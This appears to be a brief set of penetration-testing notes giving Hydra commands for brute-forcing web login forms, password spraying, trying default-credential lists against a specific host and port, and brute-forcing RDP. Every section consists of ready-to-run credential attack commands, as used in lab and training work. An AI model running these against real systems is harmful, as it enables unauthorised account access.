## Bruteforce a website
```
hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect" -V -F `

	# For password spraying, add -u flag. This will tell Hydra to try each password for every user first.
```

- combine creadentials
```bash
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
-s PORT: identify the port
http-get: method use
```

- Password spraying: use flag -u

---------------
# Brute Forcing Forms
------------------------
```bash
hydra -h | grep "Supported Services" | tr ":" "\n" | tr " " "\n" | column -e
```
- There are two modules that we're interested: 
	- http[s]-{head|get|post}: for basic HTTP authentication 
	- http[s]-post-form: used for login forms

--------------
# RDP
-------------------
- Bruteforce RDP
```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```
